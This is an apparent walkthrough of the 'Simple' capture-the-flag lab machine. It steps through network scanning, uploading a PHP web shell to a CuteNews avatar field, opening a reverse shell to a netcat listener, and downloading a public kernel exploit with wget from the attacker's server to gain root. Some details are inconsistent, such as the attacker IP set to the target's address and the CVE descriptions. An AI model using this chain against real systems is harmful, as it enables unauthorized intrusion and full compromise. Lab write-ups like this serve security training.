Simple lab presents a vulnerable machine that offers an opportunity to practice essential penetration testing techniques — from network enumeration and exploiting file upload vulnerabilities to gaining root access via local privilege escalation.

# Network Enumeration

First, identify the attacker’s IP address:
```
ifconfig
```

```bash
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet ==192.168.110.238==  netmask 255.255.255.0  broadcast 192.168.110.255
        inet6 fe80::a00:27ff:fe31:7b13  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:31:7b:13  txqueuelen 1000  (Ethernet)
        RX packets 4485  bytes 3483260 (3.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3200  bytes 796230 (777.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 24  bytes 1440 (1.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 1440 (1.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


```

In this case, the attacker’s IP was: 192.168.110.238
```
export hip=192.168.110.238
```

Next, list the IP addresses (and devices) used in a network:
```
sudo arp-scan -l
```

```bash
Interface: eth0, type: EN10MB, MAC: 08:00:27:31:7b:13, IPv4: 192.168.110.238
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.110.2	50:28:4a:4d:64:8f	(Unknown)
192.168.110.103	f2:67:3b:95:be:5c	(Unknown: locally administered)
192.168.110.158	08:00:27:b4:0c:af	(Unknown)
192.168.110.58	82:b5:aa:74:3f:a6	(Unknown: locally administered)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.978 seconds (129.42 hosts/sec). 4 responded

```

From the scan, we identified the target machine at: 192.168.110.158 looking to mac address starting with (08.00) which virtual box assigns.
```
export ip=192.168.110.158
```
# Service Discovery

To discover running services and their versions, run:
```
nmap -sCV $ip
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 23:04 IST
Nmap scan report for 192.168.110.158
Host is up (0.00054s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Please Login / CuteNews
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 08:00:27:B4:0C:AF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.92 seconds

```

The results showed that port 80 (HTTP) is open.

# Web Application Analysis

- Accessing http://192.168.110.158 in a browser redirected us to a login page. Multiple login attempts with common credentials failed.
- We then used the registration feature to create a new account, which granted us access to the dashboard.
- In the Personal Options section, there was an avatar upload feature — a good candidate for testing file upload vulnerabilities.
# Exploiting File Upload

We uploaded a simple PHP web shell, which was successfully stored.This confirms a file upload vulnerability that leads to Remote Code Execution (RCE).

# Reverse Shell Access

To obtain a more stable shell, we used a PHP reverse shell.

Edit the php-reverse-shell.php file (we use Pentest Monkey Reverse Shell php script) and set the attacker IP and port: `192.168.110.158:1337` (the port can be any accessible port)

Set up a netcat listener on the attacker’s machine:
```
nc -lnvp 1337
```
```bash
listening on [any] 1337 ...
connect to [192.168.110.238] from (UNKNOWN) [192.168.110.158] 39042
Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
 13:43:43 up 21 min,  0 users,  load average: 0.00, 0.01, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

```

# Post-Exploitation Enumeration

After gaining shell access, we ran the following commands:
```
ls  
whoami  
uname -a  
cat /etc/lsb-release
```

```bash
boot
dev
etc
home
initrd.img
lib
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
$ www-data
$ Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux

```
Based on the output, we identified a vulnerable kernel version that could be exploited.

# Privilege Escalation

Upon discovering that the target machine was running Ubuntu 14.04.2 LTS, we proceeded to research known vulnerabilities associated with that specific OS version.

During our investigation, we identified that the system was affected by CVE-2015–1862 (in pkexec/PolicyKit) and CVE-2015–1318 (in the Linux kernel’s overlayfs).

After further analysis, we located a publicly available exploit for this vulnerability on Exploit-DB, which we then used to escalate privileges on the target:

[https://www.exploit-db.com/exploits/36746](https://www.exploit-db.com/exploits/36746)

Downloaded an renamed the exploit to `try.c`

- Move to a writable directory
```
cd /tmp
```

- Host a python server inside the attacker machine 
```
python3 -m http.server 8080
```

- Download the file in the victim's machine
```
wget http://192.168.110.238:8080/try.c
```

```bash
--2025-07-01 14:00:06--  http://192.168.110.238:8080/try.c
Connecting to 192.168.110.238:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/x-csrc]
Saving to: 'try.c'

     0K ....                                                  100%  467M=0s

2025-07-01 14:00:06 (467 MB/s) - 'try.c' saved [5119/5119]

```

- extract the file using this command:
```
gcc -o exploit try.c
```

- Give the permission to execute the exploit:
```
chmod +x exploit
```

- Run the exploit:
```
./exploit
```

- Verify root access:
```
root
```

- Retrieve the flag:
```
cd ..  
ls  
cd /root  
ls  
cat flag.txt
```

# Conclusion

In this lab, we successfully performed:

- Network and host discovery
- Service enumeration
- File upload vulnerability exploitation
- Remote code execution via PHP web shell
- Reverse shell access
- Local privilege escalation using a public kernel exploit